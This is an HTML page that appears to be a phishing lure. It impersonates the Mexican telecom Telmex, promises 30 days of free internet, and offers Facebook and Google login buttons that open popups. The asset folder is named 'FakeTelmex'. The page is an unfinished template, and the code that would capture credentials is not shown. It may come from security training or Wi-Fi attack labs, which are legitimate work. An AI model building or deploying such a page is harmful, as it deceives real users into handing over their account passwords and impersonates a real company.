<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" href="assets/img/telmex.svg" type="image/x-icon">
  <link rel="stylesheet" href="assets/css/bootstrap.min.css">
  <link rel="stylesheet" href="assets/css/style.css">
  <title>Internet Gratis - Mi Telmex</title>
</head>
<body>
  <nav class="navbar navbar-expand-lg nav-bar">
    <a class="navbar-brand" href="#">
      <img src="assets/img/telmex.svg" alt="">
    </a>
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent"
      aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav mr-auto">
        <li class="nav-item active">
          <a class="nav-link" href="#">Home <span class="sr-only">(current)</span></a>
        </li>
      </ul>
    </div>
  </nav>
  <div class="container d-flex justify-content-center mt-4">
    <div class="d-flex flex-column">
      <div class="p-2 title-telmex">Mi Telmex</div>
      <div class="d-flex justify-content-center">
        <form action="">
          <h4>Iniciar Sesión</h4>
        </form>
      </div>
      <div class="d-flex justify-content-center">
        <h5>Internet Gratis Por 30 Dias</h5>
      </div>
      <div class="d-flex justify-content-center">
        <a id="facebook-button" class="btn btn-block btn-social btn-facebook" onclick="openPopUp('/facebook')">
          <img src="/FakeTelmex/assets/img/btn-fb.svg" alt="Facebook">
        </a>
        <a id="facebook-button" class="btn btn-block btn-social btn-google" onclick="openPopUp('/google')">
          <img src="/FakeTelmex/assets/img/btn-google.svg" alt="google">
        </a>
      </div>
      <div class="p-2">Flex item 3</div>
    </div>
  </div>
  <script src="assets/js/bootstrap.min.js"></script>
  <script src="assets/js/telmex.js"></script>
</body>
</html>